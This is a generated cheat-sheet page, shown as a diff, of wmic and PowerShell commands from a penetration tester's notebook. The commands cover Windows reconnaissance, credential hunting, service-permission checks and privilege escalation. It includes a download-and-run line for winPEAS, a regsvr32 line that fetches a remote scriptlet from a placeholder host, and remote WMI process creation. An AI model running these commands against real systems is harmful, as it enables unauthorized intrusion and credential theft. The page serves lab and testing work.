@@ -1,0 +1,295 @@
+---
+title: "wmic"
+sidebarTitle: "wmic"
+description: "Commands and examples collected from your wmic notes."
+keywords: ["wmic", "wmic.exe", "Get-WmiObject", "Invoke-WmiMethod"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/wmic.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=wmic) · [All tools](/index)
+
+## Windows Version and Configuration
+
+**Notebook example**
+
+```powershell
+wmic qfe
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+20 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="1. Basic Host &amp; Network Reconnaissance">
+
+### 1. Basic Host & Network Reconnaissance
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+
+</Accordion>
+
+<Accordion title="5. Windows Management Instrumentation (WMI)">
+
+### 5. Windows Management Instrumentation (WMI)
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+wmic ntdomain list /format:list
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+wmic useraccount list /format:list
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+wmic group list /format:list
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```powershell
+# 1. Automated
+iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
+C:\temp\winPEAS.exe
+
+# 2. Manual "big 5"
+whoami /priv
+whoami /groups
+systeminfo
+net user; net localgroup administrators
+Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
+```
+
+</Accordion>
+
+<Accordion title="PHASE B — PrivEsc enumeration">
+
+### PHASE B — PrivEsc enumeration
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: Unquoted service paths (space in path + no quotes = hijack)
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows\\" | findstr /iv """
+:: AlwaysInstallElevated (any .msi runs as SYSTEM if both keys = 1)
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: Stored AutoLogon creds (cleartext!)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+:: Saved creds you can reuse without knowing them
+cmdkey /list
+:: Scheduled tasks (look for writable scripts run by SYSTEM)
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
+```
+
+</Accordion>
+
+<Accordion title="CustomActions">
+
+### CustomActions
+
+**Windows Privilege Escalation: Full Checklist**
+
+```ps1
+Get-WmiObject Win32_Product | Select Name, LocalPackage
+wmic product get identifyingnumber,name,vendor,version,localpackage
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```ps1
+$installed = Get-WmiObject Win32_Product
+$string= $installed | select-string -pattern "PRODUCTNAME"
+$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
+Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
+```
+
+</Accordion>
+
+<Accordion title="EoP - Incorrect permissions in services">
+
+### EoP - Incorrect permissions in services
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+
+</Accordion>
+
+<Accordion title="EoP - Living Off The Land Binaries and Scripts">
+
+### EoP - Living Off The Land Binaries and Scripts
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wmic.exe process call create calc
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+Microsoft.Workflow.Compiler.exe tests.xml results.xml
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+tasklist /v
+net start
+sc query
+Get-Service
+Get-Process
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net start
+wmic service list brief
+tasklist /SVC
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+```
+
+</Accordion>
+
+<Accordion title="EoP - Unquoted Service Paths">
+
+### EoP - Unquoted Service Paths
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# in CMD
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+# in PowerShell
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+```
+
+</Accordion>
+
+<Accordion title="Windows Version and Configuration">
+
+### Windows Version and Configuration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wmic logicaldisk get caption || fsutil fsinfo drives
+wmic logicaldisk get caption,description,providername
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; execution">
+
+### Footprinting & execution
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```powershell
+# From Windows
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName <IP> -Credential <user>
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" -ComputerName <IP>
+```
+
+</Accordion>
+
+<Accordion title="Windows">
+
+### Windows
+
+**Privilege Escalation: Choose a Checklist**
+
+Context from the notebook: Unquoted service paths ( wmic service get name,pathname,startmode ) → binary planting
+
+```text
+wmic service get name,pathname,startmode
+```
+
+</Accordion>
+
+<Accordion title="Antivirus Enumeration">
+
+### Antivirus Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: Enumerate antivirus on a box with  WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+
+```text
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+```
+
+</Accordion>
+
+<Accordion title="MS16-032 - Microsoft Windows 7  10 / 2008  2012 R2 (x86/x64)">
+
+### MS16-032 - Microsoft Windows 7  10 / 2008  2012 R2 (x86/x64)
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: Check if the patch is installed :  wmic qfe list | findstr "3139914"
+
+```text
+wmic qfe list | findstr "3139914"
+```
+
+</Accordion>
+
+</AccordionGroup>
